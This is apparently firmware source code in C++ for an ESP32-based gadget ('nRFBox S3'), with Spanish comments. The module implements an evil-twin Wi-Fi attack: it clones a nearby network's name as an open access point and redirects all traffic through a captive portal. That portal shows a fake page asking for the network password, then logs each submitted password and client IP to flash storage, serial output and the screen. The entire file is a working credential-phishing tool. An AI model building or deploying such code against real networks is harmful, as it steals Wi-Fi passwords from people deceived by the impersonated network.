/*
  Captive Portal simple - nRFBox S3
  by General_Jhon

  - Escanea redes Wi-Fi (solo SSID y barras de señal)
  - Seleccionas red → se crea AP con el mismo nombre
  - Portal cautivo con formulario simple
  - Guarda logs en SPIFFS (/logs.csv)
  - Muestra último registro en OLED
*/

#include <WiFi.h>
#include <WebServer.h>
#include <DNSServer.h>
#include "SPIFFS.h"
#include <U8g2lib.h>
#include <Adafruit_NeoPixel.h>
#include "esp_wifi.h"


// --- OLED externo del sistema principal ---
extern U8G2_SSD1306_128X64_NONAME_F_HW_I2C oled;


// === Variables externas del sistema ===
extern bool inModule;
extern void drawMainMenu();
extern void header(const char* title);
extern bool btnPressed(int pin);
extern Adafruit_NeoPixel pixels;

// === Pines de botones ===
#define BTN_LEFT_PIN   11
#define BTN_UP_PIN     13
#define BTN_DOWN_PIN   12
#define BTN_RIGHT_PIN  10
#define BTN_SELECT_PIN 9

namespace CaptivePortal {

// --- Estado global ---
static WebServer captiveServer(80);
static DNSServer captiveDns;
static IPAddress captiveIP(192,168,4,1);
static bool captiveActive = false;
static unsigned long captiveStartMillis = 0;
static const unsigned long CAPTIVE_TIMEOUT_MS = 10UL * 60UL * 1000UL;

static int networkCount = 0;
static int scrollIndex = 0;
static int cursor = 0;
static bool scanning = false;
static bool inList = true;
static String captiveSSID = "";

// --- Datos recibidos ---
String lastUser, lastPass, lastIP;
unsigned long lastTs = 0;

// --- Guardar en SPIFFS ---
void appendLog(const String &line) {
  if (!SPIFFS.begin(true)) return;
  File f = SPIFFS.open("/logs.csv", FILE_APPEND);
  if (!f) return;
  f.println(line);
  f.close();
}

// --- Mostrar último registro en OLED ---
void updateOLED() {
  static int scrollOffset = 0;
  static unsigned long lastScroll = 0;
  const int scrollDelay = 150;  // ms entre desplazamientos

  oled.clearBuffer();
  oled.setFont(u8g2_font_5x8_tr);

  // Encabezado
  oled.setCursor(0, 10);
  oled.print("== Ultimo registro ==");

  // --- SSID ---
  oled.setCursor(0, 22);
  oled.print("SSID: ");
  String ssid = lastUser.length() ? lastUser : "-";

  // Si es largo, desplazamiento automático
  if (ssid.length() > 16) {
    if (millis() - lastScroll > scrollDelay) {
      scrollOffset++;
      if (scrollOffset > ssid.length() - 16) scrollOffset = 0;
      lastScroll = millis();
    }
    oled.print(ssid.substring(scrollOffset, scrollOffset + 16));
  } else {
    oled.print(ssid);
  }

  // --- Contraseña ---
  oled.setCursor(0, 38);
  oled.print("PASS: ");
  String pass = lastPass.length() ? lastPass : "-";

  if (pass.length() > 16) {
    if (millis() - lastScroll > scrollDelay) {
      scrollOffset++;
      if (scrollOffset > pass.length() - 16) scrollOffset = 0;
      lastScroll = millis();
    }
    oled.print(pass.substring(scrollOffset, scrollOffset + 16));
  } else {
    oled.print(pass);
  }

  // --- IP ---
  oled.setCursor(0, 54);
  oled.print("IP: ");
  oled.print(lastIP.length() ? lastIP : "-");

  oled.sendBuffer();
}


// --- Web Handlers ---
void handleRoot() {
  String html = R"rawliteral(
  <!doctype html>
  <html>
  <head>
    <meta name='viewport' content='width=device-width,initial-scale=1'>
    <title>Red inalambrica</title>
    <style>
      body {
        background-color: #0b6623;
        color: white;
        font-family: Arial, sans-serif;
        text-align: center;
        margin-top: 50px;
      }
      .container {
        background-color: #145a32;
        display: inline-block;
        padding: 20px 30px;
        border-radius: 8px;
        box-shadow: 0 0 10px rgba(0,0,0,0.4);
      }
      input[type=password] {
        width: 200px;
        padding: 6px;
        border-radius: 4px;
        border: none;
        margin-bottom: 10px;
      }
      button {
        background-color: #2ecc71;
        border: none;
        color: white;
        padding: 8px 20px;
        border-radius: 5px;
        cursor: pointer;
      }
      button:hover {
        background-color: #27ae60;
      }
      label {
        font-size: 14px;
      }
    </style>
  </head>
  <body>
    <div class='container'>
      <h3>Wireless Network, ESSID:</h3>
      <h2 id='ssid'>%SSID%</h2>
      <p>Enter your wireless network access password to access the internet</p>
      <form method='POST' action='/submit'>
        <input name='pass' type='password' placeholder='password' required><br>
        <label><input type='checkbox' onclick='togglePass()'> Show Password </label><br><br>
        <input type='hidden' name='ssid' value='%SSID%'>
        <button type='submit'>Connect</button>
      </form>
    </div>
    <script>
      function togglePass(){
        var x = document.querySelector('input[name=pass]');
        x.type = x.type === 'password' ? 'text' : 'password';
      }
    </script>
  </body>
  </html>
  )rawliteral";

  html.replace("%SSID%", captiveSSID);  // Sustituimos el SSID real
  captiveServer.send(200, "text/html", html);
}


void handleSubmit() {
  // Capturamos los campos
  String ssid = captiveServer.arg("ssid");
  String pass = captiveServer.arg("pass");
  IPAddress ip = captiveServer.client().remoteIP();

  // Guardamos los datos
  lastUser = ssid;
  lastPass = pass;
  lastIP = ip.toString();
  lastTs = millis();

  // Registro CSV
  String ln = String(lastTs) + "," + ssid + "," + ip.toString() + "," + pass;
  appendLog(ln);
  updateOLED();

  Serial.println("[CAPTIVE] " + ln);

  // --- HTML con autocierre ---
  String html = R"rawliteral(
  <!doctype html>
  <html>
  <head>
    <meta name='viewport' content='width=device-width,initial-scale=1'>
    <title>Connecting...</title>
    <style>
      body { background-color:#0b6623; color:white; font-family:Arial; text-align:center; margin-top:60px; }
      .msg { background:#145a32; display:inline-block; padding:20px 30px; border-radius:8px; box-shadow:0 0 10px rgba(0,0,0,0.4); }
    </style>
    <script>
      setTimeout(function(){
        window.close();
      }, 2500);
    </script>
  </head>
  <body>
    <div class='msg'>
      <h3>Connection established</h3>
      <p>La red <b>%SSID%</b> It has been configured correctly.</p>
      <p>This windows will close automatically.</p>
    </div>
  </body>
  </html>
  )rawliteral";

  html.replace("%SSID%", ssid);
  captiveServer.send(200, "text/html", html);
}


// --- Inicia el portal con SSID seleccionado ---
void startCaptivePortalWithSSID(const String &ssid) {
  captiveSSID = ssid;
  WiFi.disconnect(true);
  delay(150);

  WiFi.mode(WIFI_AP);
  WiFi.softAPConfig(captiveIP, captiveIP, IPAddress(255,255,255,0));
  WiFi.softAP(captiveSSID.c_str(), "");
  delay(200);

  captiveDns.start(53, "*", captiveIP);
  captiveServer.on("/", HTTP_GET, handleRoot);
  captiveServer.on("/submit", HTTP_POST, handleSubmit);
  captiveServer.onNotFound([](){
    captiveServer.sendHeader("Location", String("http://") + captiveIP.toString(), true);
    captiveServer.send(302, "text/plain", "");
  });
  captiveServer.begin();

  captiveActive = true;
  captiveStartMillis = millis();

  oled.clearBuffer();
  oled.setFont(u8g2_font_6x10_tr);
  oled.drawStr(2, 12, "CAPTIVE: ON");
  oled.drawStr(2, 28, captiveSSID.substring(0,20).c_str());
  oled.drawStr(2, 44, "LEFT: Apagar portal");
  oled.sendBuffer();
}

// --- Loop del portal cautivo ---
void captivePortalLoop() {
  captiveDns.processNextRequest();
  captiveServer.handleClient();

  // 🔙 Si se presiona LEFT, apagar portal
  if (digitalRead(BTN_LEFT_PIN) == LOW) {
    captiveServer.stop();
    captiveDns.stop();
    WiFi.softAPdisconnect(true);
    WiFi.disconnect(true);
    captiveActive = false;

    oled.clearBuffer();
    oled.drawStr(2, 30, "CAPTIVE OFF");
    oled.sendBuffer();
    delay(600);

    // 🧩 Reinicio estable del stack WiFi para evitar bloqueo
    WiFi.mode(WIFI_STA);
    delay(200);
    esp_wifi_stop();
    delay(200);
    esp_wifi_start();
    delay(200);
    WiFi.disconnect(true);

    // 🔁 Reinicia escaneo de redes
    scanning = true;
    networkCount = WiFi.scanNetworks(true);
    captiveStartMillis = millis();
    return;
  }

  // ⏰ Si expira el tiempo, detener portal automáticamente
  if (millis() - captiveStartMillis > CAPTIVE_TIMEOUT_MS) {
    captiveServer.stop();
    captiveDns.stop();
    WiFi.softAPdisconnect(true);
    WiFi.disconnect(true);
    captiveActive = false;

    oled.clearBuffer();
    oled.drawStr(2, 30, "TIMEOUT");
    oled.sendBuffer();
    delay(600);

    // 🧩 Reinicio del stack WiFi igual que al salir manualmente
    WiFi.mode(WIFI_STA);
    delay(200);
    esp_wifi_stop();
    delay(200);
    esp_wifi_start();
    delay(200);
    WiFi.disconnect(true);

    scanning = true;
    networkCount = WiFi.scanNetworks(true);
    captiveStartMillis = millis();
  }
}


// --- Dibujar lista simple de redes ---
void drawList() {
  oled.clearBuffer();
  oled.setFont(u8g2_font_5x8_tr);
  oled.drawStr(2, 10, "REDES DISPONIBLES");

  int visible = min(6, max(0, networkCount - scrollIndex));
  for (int i = 0; i < visible; i++) {
    int idx = scrollIndex + i;
    String ssid = WiFi.SSID(idx);
    int rssi = WiFi.RSSI(idx);
    int bars = constrain(map(rssi, -90, -30, 0, 5), 0, 5);

    int y = 22 + i * 9;
    if (i == cursor) {
      oled.drawBox(0, y-7, 128, 9);
      oled.setDrawColor(0);
      oled.drawStr(2, y, ssid.substring(0,16).c_str());
      oled.setDrawColor(1);
    } else oled.drawStr(2, y, ssid.substring(0,16).c_str());

    for (int b = 0; b < bars; b++)
      oled.drawBox(110 + b*3, y-6, 2, 6);
  }
  oled.sendBuffer();
}

// --- Setup inicial ---
void setup() {
  header("Captive Portal");
  oled.drawStr(2, 24, "Iniciando...");
  oled.sendBuffer();

  WiFi.mode(WIFI_STA);
  WiFi.disconnect(true);
  delay(200);

  pixels.setBrightness(25);
  pixels.clear(); pixels.show();

  scanning = true;
  pixels.setPixelColor(0, pixels.Color(0,0,255));
  pixels.show();

  networkCount = WiFi.scanNetworks(true);
}

// --- Loop principal ---
void loop() {
  if (captiveActive) { captivePortalLoop(); return; }

  if (digitalRead(BTN_LEFT_PIN) == LOW) {
    WiFi.scanDelete();
    WiFi.disconnect(true);
    pixels.clear(); pixels.show();
    inModule = false;
    drawMainMenu();
    delay(250);
    return;
  }

  if (scanning) {
    header("Captive Portal");
    oled.drawStr(2, 30, "Escaneando...");
    oled.sendBuffer();
    pixels.setPixelColor(0, pixels.Color(0,0,100));
    pixels.show();
    int16_t result = WiFi.scanComplete();
    if (result >= 0) {
      scanning = false;
      networkCount = result;
      drawList();
    }
    return;
  }

  if (btnPressed(BTN_DOWN_PIN)) {
    if (cursor < 5 && (scrollIndex + cursor) < networkCount - 1) cursor++;
    else if (scrollIndex + 6 < networkCount) scrollIndex++;
    drawList(); return;
  }

  if (btnPressed(BTN_UP_PIN)) {
    if (cursor > 0) cursor--;
    else if (scrollIndex > 0) scrollIndex--;
    drawList(); return;
  }

  if (btnPressed(BTN_RIGHT_PIN) || btnPressed(BTN_SELECT_PIN)) {
    int absolute = scrollIndex + cursor;
    if (absolute < networkCount) startCaptivePortalWithSSID(WiFi.SSID(absolute));
    return;
  }

  drawList();
}

void stop() {
  if (!captiveActive) return;

  Serial.println("🛑 Deteniendo Captive Portal...");
  captiveServer.stop();
  captiveDns.stop();
  WiFi.softAPdisconnect(true);
  WiFi.disconnect(true);
  captiveActive = false;

  oled.clearBuffer();
  oled.setFont(u8g2_font_6x10_tr);
  oled.drawStr(2, 30, "CAPTIVE: OFF");
  oled.sendBuffer();

  delay(300);
  Serial.println("✅ Captive Portal detenido correctamente");
}



} // namespace CaptivePortal

